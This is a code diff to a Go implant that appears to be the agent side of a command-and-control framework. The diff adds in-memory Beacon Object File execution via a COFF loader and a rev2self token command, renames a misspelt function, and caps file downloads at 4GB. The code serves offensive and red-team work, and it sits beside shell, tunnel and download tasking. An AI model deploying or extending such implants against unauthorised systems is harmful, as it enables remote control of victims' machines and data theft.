@@ -9,9 +9,11 @@ import (
 	"crypto/rand"
 	"crypto/tls"
 	"crypto/x509"
+	"encoding/base64"
 	"errors"
 	"fmt"
 	"github.com/vmihailenco/msgpack/v5"
+	"gopher/bof/coffer"
 	"gopher/functions"
 	"gopher/utils"
 	"io"
@@ -58,6 +60,9 @@ func TaskProcess(commands [][]byte) [][]byte {
 		case utils.COMMAND_CP:
 			data, err = taskCp(command.Data)
 
+		case utils.COMMAND_EXEC_BOF:
+			data, err = taskExecBof(command.Data)
+
 		case utils.COMMAND_EXIT:
 			data, err = taskExit()
 
@@ -85,6 +90,9 @@ func TaskProcess(commands [][]byte) [][]byte {
 		case utils.COMMAND_PWD:
 			data, err = taskPwd()
 
+		case utils.COMMAND_REV2SELF:
+			data, err = taskRev2Self()
+
 		case utils.COMMAND_RM:
 			data, err = taskRm(command.Data)
 
@@ -101,7 +109,7 @@ func TaskProcess(commands [][]byte) [][]byte {
 			jobTerminal(command.Data)
 
 		case utils.COMMAND_TERMINAL_STOP:
-			taskTernalKill(command.Data)
+			taskTerminalKill(command.Data)
 
 		case utils.COMMAND_TUNNEL_START:
 			jobTunnel(command.Data)
@@ -208,6 +216,25 @@ func taskCp(paramsData []byte) ([]byte, error) {
 	}
 
 	return nil, err
+}
+
+func taskExecBof(paramsData []byte) ([]byte, error) {
+	var params utils.ParamsExecBof
+	if err := msgpack.Unmarshal(paramsData, &params); err != nil {
+		return nil, err
+	}
+
+	args, err := base64.StdEncoding.DecodeString(params.ArgsPack)
+	if err != nil {
+		args = make([]byte, 1)
+	}
+
+	out, err := coffer.Load(params.Object, args)
+	if err != nil {
+		return nil, err
+	}
+
+	return msgpack.Marshal(utils.AnsExecBof{Output: out})
 }
 
 func taskExit() ([]byte, error) {
@@ -370,6 +397,11 @@ func taskPwd() ([]byte, error) {
 	return msgpack.Marshal(utils.AnsPwd{Path: path})
 }
 
+func taskRev2Self() ([]byte, error) {
+	functions.Rev2Self()
+	return nil, nil
+}
+
 func taskRm(paramsData []byte) ([]byte, error) {
 	var params utils.ParamsRm
 	err := msgpack.Unmarshal(paramsData, &params)
@@ -422,7 +454,7 @@ func taskShell(paramsData []byte) ([]byte, error) {
 	return msgpack.Marshal(utils.AnsShell{Output: string(output)})
 }
 
-func taskTernalKill(paramsData []byte) {
+func taskTerminalKill(paramsData []byte) {
 	var params utils.ParamsTerminalStop
 	err := msgpack.Unmarshal(paramsData, &params)
 	if err != nil {
@@ -554,6 +586,12 @@ func jobDownloadStart(paramsData []byte) ([]byte, error) {
 	info, err := os.Stat(path)
 	if err != nil {
 		return nil, err
+	}
+
+	size := info.Size() // тип int64
+
+	if size > 4*1024*1024*1024 {
+		return nil, errors.New("file too big (>4GB)")
 	}
 
 	var content []byte
